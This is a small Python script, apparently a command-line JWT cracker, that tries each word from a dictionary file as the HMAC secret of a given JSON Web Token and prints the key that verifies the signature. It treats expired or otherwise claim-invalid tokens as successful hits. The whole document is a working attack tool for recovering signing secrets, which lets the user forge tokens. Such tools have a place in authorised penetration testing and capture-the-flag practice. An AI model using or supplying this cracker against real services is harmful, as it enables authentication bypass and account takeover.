import jwt
import termcolor
import sys


if len(sys.argv) != 3:
    print('clack_jwt.py jwt_str dic.txt')
    exit(-1)
else:
    jwt_str = sys.argv[1]
    file = sys.argv[2]


print("jwt_str: %s\nDict: %s" % (termcolor.colored(jwt_str, 'red'), termcolor.colored(file, 'red')))

with open(file, 'r') as f:
    for line in f:
        key_ = line .strip()
        try:
            jwt.decode(jwt_str, verify=True, key=key_)
            print('\r', ' \bbingo! found key -->', termcolor.colored(key_, 'green'), '<--' )
            break
        except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
            print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
            break
        except jwt.exceptions.InvalidSignatureError:
            print('\r', '' * 64, '\r\btry', key_, end='', flush=True)
            continue
    else:
        print('\r', '\bsorry! no key be found.' )
